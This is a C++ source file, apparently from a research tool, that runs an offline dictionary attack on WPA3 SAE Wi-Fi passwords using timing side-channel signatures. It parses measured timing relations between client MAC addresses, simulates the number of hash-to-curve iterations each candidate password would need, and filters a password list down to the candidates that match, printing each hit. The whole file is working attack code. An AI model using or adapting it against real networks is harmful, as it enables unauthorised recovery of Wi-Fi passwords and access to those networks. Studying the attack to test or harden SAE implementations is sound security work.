#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "sae.h"
#include "timingresults.h"

class PwFilterAverage;

class MacAddrSimulation
{
friend PwFilterAverage;
private:
	PasswordSignature *context;
	uint8_t macaddr[6];
	bool simulated;

	int num_iterations;
	int num_hashes_toobig;

	void simulate_derivation();

public:
	MacAddrSimulation(PasswordSignature *context, uint8_t *macaddr);
	void reset();
	int get_iterations();
	int get_hashes_toobig();
};


class PwFilter
{
public:
	virtual bool filter() = 0;
};

class PwFilterVariance : public PwFilter
{
private:
	MacAddrSimulation *macaddr_lower_var;
	MacAddrSimulation *macaddr_higher_var;

public:
	PwFilterVariance(MacAddrSimulation *macaddr_higher, MacAddrSimulation *macaddr_lower)
		: macaddr_lower_var(macaddr_lower), macaddr_higher_var(macaddr_higher)
	{ }

	virtual bool filter()
	{
		int more_iter = macaddr_lower_var->get_iterations();
		int less_iter = macaddr_higher_var->get_iterations();

		return more_iter > less_iter;
	}
};

struct time_simulation {
	double time_bighash;
	double time_qrtest;
};

class PwFilterAverage : public PwFilter
{
private:
	static double factors28[];
	static double factors29[];
	static double factors30[];
	MacAddrSimulation *macaddr_faster;
	MacAddrSimulation *macaddr_slower;
	double pr_toobig;
	double *factors;
	int group;

	// TODO: Use integers instead of double for higher performance
	double simulate_time_impl(MacAddrSimulation *addr, int impl)
	{
		int num_iterations = addr->get_iterations();
		int num_hashtoobig = addr->get_hashes_toobig();
		int remaining = 40 - num_iterations;

		double time_fixed = num_hashtoobig * 1 + (num_iterations - num_hashtoobig) * factors[impl];
		double time_remaining = remaining * (pr_toobig * 1 + (1 - pr_toobig) * factors[impl]);
		return time_fixed + time_remaining;
	}


public:
	PwFilterAverage(MacAddrSimulation *macaddr_slower, MacAddrSimulation *macaddr_faster, int group)
		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower), group(group)
	{
		switch (group) {
		case 28:
			factors = factors28;
			pr_toobig = 0.3360;
			break;

		case 29:
			factors = factors29;
			pr_toobig = 0.4503;
			break;

		case 30:
			factors = factors30;
			pr_toobig = 0.3326;
			break;

		default:
			fprintf(stderr, "ERROR: Unsupported group in %s\n", __FUNCTION__);
			exit(1);
			break;
		}
	}

	/**
	 * Returns true if it _could_ be the password.
	 */
	virtual bool filter()
	{
		for (int i = 0; i < 3; ++i)
		{
			double time_faster = simulate_time_impl(macaddr_faster, i);
			double time_slower = simulate_time_impl(macaddr_slower, i);

			// If the measurement allows the password on *some* implementation,
			// then we do not filter away the password.
			if (time_faster < time_slower)
				return true;
		}

		// If the password is invalid on all implementations,
		// then we filter it away.
		return false;
	}
};

double PwFilterAverage::factors28[] = { 17.41, 16.74, 23.21 }; // Ratio on work laptop
double PwFilterAverage::factors29[] = { 16.17, 15.84, 25.23 }; // Ratio on personal laptop
double PwFilterAverage::factors30[] = { 14.33, 18.99, 46.33 }; // Ratio on raspberry pi


void MacAddrSimulation::simulate_derivation()
{
	if (simulated)
		return;

	this->num_iterations = sae_num_elemtests_ecc(context->ec, context->bssid,
				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
				context->pwd_seed, &this->num_hashes_toobig);

	simulated = true;
}

MacAddrSimulation::MacAddrSimulation(PasswordSignature *context, uint8_t *macaddr)
{
	this->context = context;
	memcpy(this->macaddr, macaddr, 6);
	this->simulated = false;
}

void MacAddrSimulation::reset()
{
	this->simulated = false;
}

int MacAddrSimulation::get_iterations()
{
	simulate_derivation();

	return num_iterations;
}

int MacAddrSimulation::get_hashes_toobig()
{
	simulate_derivation();

	return num_hashes_toobig;
}


bool PasswordSignature::parse_macaddr(const char *charaddr, uint8_t *macaddr)
{
	int intaddr[6];
	int rval = sscanf(charaddr, "%02X:%02X:%02X:%02X:%02X:%02X", &intaddr[0], &intaddr[1],
		&intaddr[2], &intaddr[3], &intaddr[4], &intaddr[5]);

	for (int i = 0; i < 6; ++i)
		macaddr[i] = intaddr[i];

	return rval == 6;
}

MacAddrSimulation * PasswordSignature::lookup_macaddr(const char *charaddr)
{
	if (charaddr == NULL)
		return NULL;

	uint8_t macaddr[6];
	if (!parse_macaddr(charaddr, macaddr))
		return NULL;

	std::string straddr((const char *)macaddr, 6);
	auto it = macaddr_map.find(straddr);
	if (it != macaddr_map.end()) {
		return it->second;
	} else {
		MacAddrSimulation *addrSimul = new MacAddrSimulation(this, macaddr);
		macaddr_map[straddr] = addrSimul;
		return addrSimul;
	}
}

int PasswordSignature::read_password_signature(const char *filename)
{
	char line[1024];
	int rval = -1;

	FILE *fp = fopen(filename, "r");
	if (fp == NULL) {
		fprintf(stderr, "Failed to open %s: ", filename);
		return -1;
	}

	while (fgets(line, sizeof(line), fp) != NULL)
	{
		line[sizeof(line) - 1] = '\0';

		char *filter = strtok(line, " ");
		char *optarg1 = strtok(NULL, " ");
		char *optarg2 = strtok(NULL, " ");

		if (strcmp(filter, "BSSID") == 0)
		{
			if (!parse_macaddr(optarg1, this->bssid)) {
				fprintf(stderr, "Failed to parse BSSID in line: %s\n", line);
				goto fail;
			}
		}
		else if (strcmp(filter, "Group") == 0)
		{
			// TODO: Also support MODP groups!!
			this->group = atoi(optarg1);
			this->ec = ec_group_init(this->group);
			if (this->ec == NULL) {
				fprintf(stderr, "Failed to initialize group in line: %s\n", line);
				goto fail;
			}
		}
		// Note: in the future we can add filters where we take into account an
		// estimate of which iteration they were found in, or a min/max on the
		// amount of hash values that were too big, or whether they were found
		// in an exact iteration.
		else if (strcmp(filter, "HigherVariance") == 0)
		{
			MacAddrSimulation *addr1 = lookup_macaddr(optarg1);
			MacAddrSimulation *addr2 = lookup_macaddr(optarg2);

			if (addr1 == NULL || addr2 == NULL) {
				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
				goto fail;
			}

			filters.push_back(new PwFilterVariance(addr1, addr2));
		}
		else if (strcmp(filter, "HigherAverage") == 0)
		{
			MacAddrSimulation *addr1 = lookup_macaddr(optarg1);
			MacAddrSimulation *addr2 = lookup_macaddr(optarg2);

			if (addr1 == NULL || addr2 == NULL) {
				fprintf(stderr, "Couldn't parse MAC addresses in line: %s\n", line);
				goto fail;
			}

			filters.push_back(new PwFilterAverage(addr1, addr2, this->group));
		}
		else
		{
			fprintf(stderr, "Unrecognized filter in line: %s\n", filter);
			goto fail;
		}

	}

	rval = 1;
fail:
	fclose(fp);
	return rval;
}

PasswordSignature::PasswordSignature(const char *filename)
{
	if (read_password_signature(filename) < 0)
		throw std::runtime_error("Could not open signature file");
}

bool PasswordSignature::check_password(const char *password)
{
	// All filters will automatically access this password
	this->password = password;

	// Need to reset all MacAddrSimulations so they use the new password
	for (std::map<std::string, MacAddrSimulation*>::iterator it = macaddr_map.begin(); macaddr_map.end() != it; ++it) {
		it->second->reset();
	}

	// Now try each filter and see if one of them rejects the password
	for (std::vector<PwFilter*>::iterator it = filters.begin(); it != filters.end(); it++)
	{
		PwFilter *pwFilter = *it;
		if (!pwFilter->filter())
			return false;
	}

	return true;
}

int PasswordSignature::bruteforce(PasswordList *passwords)
{
	int num_possible = 0;
	const char *pw = passwords->next();
	int num_checked = 0;

	printf("Bruteforcing %d passwords using group %d\n", passwords->size(), group);

	while (pw != NULL)
	{
		if (num_checked % 2000 == 0)
			printf("Checking for password %d: %s\n", num_checked + 1, pw);

		if (check_password(pw)) {
			// For debugging... TODO: Remove me
			printf("FOUND: %s\n", pw);
			static int first = 1;
			if (!first)
				exit(1);
			first = 0;

			num_possible++;
		}

		num_checked++;
		pw = passwords->next();
	}

	return num_possible;
}

